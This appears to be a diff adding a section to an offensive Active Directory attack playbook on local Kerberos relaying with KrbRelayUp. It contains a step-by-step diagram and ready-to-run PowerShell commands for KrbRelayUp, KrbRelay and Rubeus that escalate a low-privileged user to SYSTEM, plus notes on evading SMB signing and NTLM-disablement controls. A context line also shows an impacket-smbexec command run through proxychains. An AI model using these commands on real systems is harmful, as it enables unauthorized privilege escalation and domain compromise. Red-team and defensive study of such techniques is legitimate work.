@@ -210,6 +210,54 @@ proxychains impacket-smbexec -no-pass 'CORP/SRVADMIN@10.0.0.22'
 
 ---
 
+### Attack Chain C: Local Kerberos Relaying & KrbRelayUp (Local Privilege Escalation)
+
+While traditional NTLM relay attacks require network-level traffic and fail when SMB signing is enforced, **Local Kerberos Relaying** (developed by Dec0ne, building on James Forshaw's research) allows an unprivileged local attacker to achieve **SYSTEM** on a workstation or member server using Kerberos authentication alone.
+
+```
++-----------------------------------------------------------------------------------------+
+| LOCAL KERBEROS RELAY & KRBRELAYUP MECHANICS                                              |
+|                                                                                         |
+|  LOCAL WORKSTATION (WS01)                                      DOMAIN CONTROLLER (DC)   |
+|  Attacker: lowpriv (Local Standard User)                       IP: 10.0.0.1             |
+|                                                                                         |
+|  1. Attacker starts local rogue listener on 127.0.0.1                                   |
+|  2. Coerces local SYSTEM via DCOM / RPC (e.g. IStorage / OXID)                          |
+|     Forces SYSTEM to authenticate to 127.0.0.1 using KERBEROS!                          |
+|                                                                                         |
+|  3. Attacker captures SYSTEM's Kerberos AP-REQ ticket                                   |
+|  4. Relays Kerberos AP-REQ to DC LDAP (Port 389/636)!                                   |
+|     Authenticated to AD as WS01$ (Machine Account)!                                     |
+|                                                                                         |
+|  5. Relayed session writes RBCD to WS01$ in AD:                                         |
+|     Sets msDS-AllowedToActOnBehalfOfOtherIdentity = Attacker Controlled Machine         |
+|     (Or writes Shadow Credentials via msDS-KeyCredentialLink)                           |
+|                                                                                         |
+|  6. Attacker executes S4U2self & S4U2proxy -> Requests Administrator ticket for WS01    |
+|  7. Injects ticket into session -> Instant Local SYSTEM Privilege Escalation!           |
++-----------------------------------------------------------------------------------------+
+```
+
+#### Operational Execution with KrbRelayUp:
+```powershell
+# Automated end-to-end local escalation via KrbRelayUp:
+.\KrbRelayUp.exe relay -Domain corp.local -ComputerName "WS01"
+
+# Or manual execution with KrbRelay and Rubeus:
+# Terminal 1: Start KrbRelay listening for LDAP relay
+.\KrbRelay.exe -spn ldap/dc01.corp.local -clsid {90f18417-f0f1-484e-9d3c-59dceee5dbd8} -rbcd
+
+# Terminal 2: Obtain ticket via S4U and elevate to SYSTEM
+.\Rubeus.exe s4u /user:ATTACKCOMP$ /rc4:<hash> /impersonate:Administrator /msdsspn:host/ws01.corp.local /ptt
+```
+
+* **Why it Bypasses Traditional Controls**:
+  - Requires **zero external network access**; executes entirely on the local loopback interface.
+  - Immune to SMB Signing enforcement because it relays to **LDAP / LDAPS**.
+  - Evades NTLM-disablement policies because it operates entirely over **Kerberos**.
+
+---
+
 ## 5. Field Operator Troubleshooting & Error Scenarios
 
 ```
